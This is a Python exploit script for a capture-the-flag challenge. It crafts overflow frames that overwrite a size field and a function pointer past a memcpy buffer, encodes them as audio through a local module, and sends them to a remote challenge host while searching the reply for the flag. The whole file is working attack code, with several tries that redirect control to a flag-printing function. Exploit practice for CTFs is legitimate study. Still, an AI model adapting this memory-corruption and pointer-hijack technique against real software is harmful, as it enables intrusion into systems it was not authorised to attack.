import base64
import os
import re
import socket
import struct
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
import enc

HOST, PORT = "pwn.h7tex.com", 40918
SZ = struct.pack("<Q", 0x41)


def frame_for(n, at48=None, at40=True):
    """n = so byte memcpy ghi tu dau g_cal (n chan)."""
    count = n // 2
    d = bytearray(n)
    if at40 and n >= 48:
        for i in range(8):
            d[40 + i] = SZ[i]
    if at48:
        d[48], d[49] = at48
    return bytes([0x01, 0x01, 0x0E]) + bytes([0x02, 1 + n, count]) + bytes(d)


def run(tag, payload, outdir="tries"):
    os.makedirs(outdir, exist_ok=True)
    wav = enc.capture(payload)[0]
    s = socket.create_connection((HOST, PORT), timeout=30)
    s.sendall(base64.b64encode(wav) + b"\n")
    got = b""
    why = ""
    while True:
        try:
            c = s.recv(65536)
        except Exception as e:
            why = type(e).__name__
            break
        if not c:
            why = "EOF"
            break
        got += c
    s.close()
    open(os.path.join(outdir, tag + ".txt"), "wb").write(got)
    txt = got.decode(errors="replace")
    hit = re.search(r"H7CTF\{[^}\n]*\}|FACTORY|unavailable", txt)
    tail = txt.replace("\n", " | ")[-220:]
    print("%-22s %6dB %-4s flag=%s | %s" % (tag, len(got), why, bool(hit), tail))
    return txt


if __name__ == "__main__":
    run("A_48B_notouch", frame_for(48))
    run("B_fn_eq_orig", frame_for(50, at48=(0x90, 0x26)))
    run("C_fn_flag", frame_for(50, at48=(0xA0, 0x26)))
    run("D_bad_ptr", frame_for(50, at48=(0xFF, 0xFF)))
    run("E_56B", frame_for(56, at48=(0xA0, 0x26)))
    run("F_64B", frame_for(64, at48=(0xA0, 0x26)))
